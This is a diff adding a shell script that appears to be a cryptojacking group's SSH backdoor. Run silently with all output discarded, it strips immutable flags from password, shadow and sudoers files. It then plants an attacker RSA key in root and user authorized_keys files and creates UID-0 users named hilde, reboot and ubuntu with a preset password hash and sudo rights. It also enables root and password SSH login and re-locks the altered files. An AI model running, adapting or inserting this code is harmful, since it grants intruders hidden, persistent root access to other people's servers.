@@ -1,0 +1,98 @@
+#!/bin/sh
+
+which -a sshd 2>/dev/null 1>/dev/null
+return_sshd=$?
+if [ $return_sshd != 0 ]; then
+apt-get update --fix-missing 2>/dev/null 1>/dev/null
+apt-get install -y openssh-server 2>/dev/null 1>/dev/null
+apt-get install -y --reinstall openssh-server 2>/dev/null 1>/dev/null
+yum install -y openssh-server 2>/dev/null 1>/dev/null
+yum reinstall -y openssh-server 2>/dev/null 1>/dev/null
+apk update; apk add openssh-server 2>/dev/null 1>/dev/null
+fi
+tntrecht -ia /etc/passwd 2>/dev/null 1>/dev/null
+chattr -ia /etc/passwd	 2>/dev/null 1>/dev/null
+tntrecht -ia /etc/shadow 2>/dev/null 1>/dev/null
+chattr -ia /etc/shadow 2>/dev/null 1>/dev/null
+RSAKEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/g11TQs97a6DPQbrbIGvbNzbRVJgXw1OLrLFJDWFc1t+52tVFvkLHjWikS/X2nvyjW826YjbglNVUdkV3hzG+ApvvaLn+v20SzI5bs48Yyv+APczVp0LO2e6o1WLHyRNwYMZEiGI30lGIuUmBleH1XXeR+KBdMr0nqN0V18jmGtxYEBM9gwhD8VSCDFjLA5vE0uciqpn58oOSS3la+25fQyrFEN/S1orI2arh0qsfdrWIQ6ftLgtBW4F52maKMjpBXi/MugMMqbog6S4Sm3S6Pnh79clL7A1ghNnt3/pAUOxXKlWqopwueBFfGF56UExYn5h4bpyF8gd9ZGdUJJxBgLtG80BgLDa+ZT8deJ4K4QMKbwkS2PjlHzf6GzF8BR2UNmoaejFzcHAalNhKxhdybvfDR9djCc5c2Tjt+2HQIUsHdDWknbcUcvjQpJBRc1BRlNBX1y0M5oaPSfgRInRv75Dw4TfYazM1QFWJCKs+8tvQJncz5dHeAaaNfXQKk3EVzS5WRpy2wYsTjU0kZrKiWDTu6PDS2uwY8p7SsSdGfC1xYNonCEeHCuDNGOYVetxjy3IS7kWyXl5mFZmZVjSTub7/T6k6KwrlzwmCVG46Y2FFyH1Vpx8dWKUkB2fQS3pBCD4jw1GdbsmfaM0YQBthIh8h9jN1Uieo++IMymiAdw== hilde@teamtnt.red"
+mkdir /root/.ssh/ -p 2>/dev/null 1>/dev/null
+chattr -ia /root/.ssh/ 2>/dev/null 1>/dev/null
+tntrecht -ia /root/.ssh/ 2>/dev/null 1>/dev/null
+>/root/.ssh/authorized_keys2 2>/dev/null 1>/dev/null
+tntrecht -ia /root/.ssh/authorized_keys 2>/dev/null 1>/dev/null
+chattr -ia /root/.ssh/authorized_keys 2>/dev/null 1>/dev/null
+tntrecht -ia /root/.ssh/authorized_keys2 2>/dev/null 1>/dev/null
+chattr -ia /root/.ssh/authorized_keys2 2>/dev/null 1>/dev/null
+chmod 1777 /root/.ssh/authorized_keys 2>/dev/null 1>/dev/null
+chmod 1777 /root/.ssh/authorized_keys2 2>/dev/null 1>/dev/null
+echo $RSAKEY >> /root/.ssh/authorized_keys 2>/dev/null 1>/dev/null
+echo $RSAKEY > /root/.ssh/authorized_keys2 2>/dev/null 1>/dev/null
+chmod 700 /root/.ssh 2>/dev/null 1>/dev/null
+chmod 600 /root/.ssh/authorized_keys 2>/dev/null 1>/dev/null
+chmod 600 /root/.ssh/authorized_keys2 2>/dev/null 1>/dev/null
+tntrecht +ia /root/.ssh/authorized_keys 2>/dev/null 1>/dev/null
+chattr +ia /root/.ssh/authorized_keys 2>/dev/null 1>/dev/null
+tntrecht +ia /root/.ssh/authorized_keys2 2>/dev/null 1>/dev/null
+chattr +ia /root/.ssh/authorized_keys2 2>/dev/null 1>/dev/null
+tntrecht -ia /etc/sudoers 2>/dev/null 1>/dev/null
+chattr -ia /etc/sudoers 2>/dev/null 1>/dev/null
+
+USERARRAY=(hilde reboot ubuntu)
+for usersname in "${USERARRAY[@]}"
+do
+useradd -p /BnKiPmXA2eAQ -G root $usersname 2>/dev/null 1>/dev/null
+useradd -p /BnKiPmXA2eAQ -g root $usersname 2>/dev/null 1>/dev/null
+adduser $usersname sudo 2>/dev/null 1>/dev/null
+adduser $usersname sudoers 2>/dev/null 1>/dev/null
+adduser $usersname root 2>/dev/null 1>/dev/null
+usermod -o -u 0 -g 0 $usersname 2>/dev/null 1>/dev/null
+mkdir /home/$usersname/.ssh/ -p 2>/dev/null 1>/dev/null
+>/home/$usersname/.ssh/authorized_keys2 2>/dev/null 1>/dev/null
+tntrecht -ia /home/$usersname/.ssh/authorized_keys 2>/dev/null 1>/dev/null
+chattr -ia /home/$usersname/.ssh/authorized_keys 2>/dev/null 1>/dev/null
+tntrecht -ia /home/$usersname/.ssh/authorized_keys2 2>/dev/null 1>/dev/null
+chattr -ia /home/$usersname/.ssh/authorized_keys2 2>/dev/null 1>/dev/null
+echo $RSAKEY >  /home/$usersname/.ssh/authorized_keys 2>/dev/null 1>/dev/null
+echo $RSAKEY >  /home/$usersname/.ssh/authorized_keys2 2>/dev/null 1>/dev/null
+chown $usersname:$usersname /home/$usersname/.ssh/authorized_keys 2>/dev/null 1>/dev/null
+chown $usersname:$usersname /home/$usersname/.ssh/authorized_keys2 2>/dev/null 1>/dev/null
+chmod 700 /home/$usersname/.ssh 2>/dev/null 1>/dev/null
+chmod 600 /home/$usersname/.ssh/authorized_keys 2>/dev/null 1>/dev/null
+chmod 600 /home/$usersname/.ssh/authorized_keys2 2>/dev/null 1>/dev/null
+tntrecht +ia /home/$usersname/.ssh/authorized_keys 2>/dev/null 1>/dev/null
+chattr +ia /home/$usersname/.ssh/authorized_keys 2>/dev/null 1>/dev/null
+tntrecht +ia /home/$usersname/.ssh/authorized_keys2 2>/dev/null 1>/dev/null
+chattr +ia /home/$usersname/.ssh/authorized_keys2 2>/dev/null 1>/dev/null
+echo "$usersname  ALL=(ALL:ALL) ALL" >> /etc/sudoers 2>/dev/null 1>/dev/null
+done
+tntrecht +ia /etc/sudoers 2>/dev/null 1>/dev/null
+chattr +ia /etc/sudoers 2>/dev/null 1>/dev/null
+tntrecht -ia /etc/ssh/sshd_config 2>/dev/null 1>/dev/null
+chattr -ia /etc/ssh/sshd_config 2>/dev/null 1>/dev/null
+echo "AuthorizedKeysFile        /etc/ssh/authorized_keys" >> /etc/ssh/sshd_config 2>/dev/null 1>/dev/null
+echo $RSAKEY > /etc/ssh/authorized_keys 2>/dev/null 1>/dev/null
+chmod 600 /etc/ssh/authorized_keys 2>/dev/null 1>/dev/null
+chattr +i /etc/ssh/authorized_keys 2>/dev/null 1>/dev/null
+tntrecht +i /etc/ssh/authorized_keys 2>/dev/null 1>/dev/null
+sed -i "s#PasswordAuthentication no#PasswordAuthentication yes#g" /etc/ssh/sshd_config 2>/dev/null 1>/dev/null
+sleep 2
+sed -i "s#PermitRootLogin no#PermitRootLogin yes#g" /etc/ssh/sshd_config 2>/dev/null 1>/dev/null
+sleep 2
+sed -i "s#PubkeyAuthentication no#PubkeyAuthentication yes#g" /etc/ssh/sshd_config 2>/dev/null 1>/dev/null
+sleep 2
+uniq /etc/ssh/sshd_config > /etc/ssh/sshd_config2
+mv /etc/ssh/sshd_config /etc/ssh/sshd_config.bak
+mv /etc/ssh/sshd_config2 /etc/ssh/sshd_config
+tntrecht +ia /etc/ssh/sshd_config 2>/dev/null 1>/dev/null
+chattr +ia /etc/ssh/sshd_config 2>/dev/null 1>/dev/null
+tntrecht +ia /etc/passwd 2>/dev/null 1>/dev/null
+chattr +ia /etc/passwd 2>/dev/null 1>/dev/null
+tntrecht +ia /etc/shadow 2>/dev/null 1>/dev/null
+chattr +ia /etc/shadow 2>/dev/null 1>/dev/null
+systemctl restart sshd 2>/dev/null 1>/dev/null
+sleep 2
+service sshd restart 2>/dev/null 1>/dev/null
+sleep 2
+systemctl restart ssh 2>/dev/null 1>/dev/null
+sleep 2
+service ssh restart 2>/dev/null 1>/dev/null
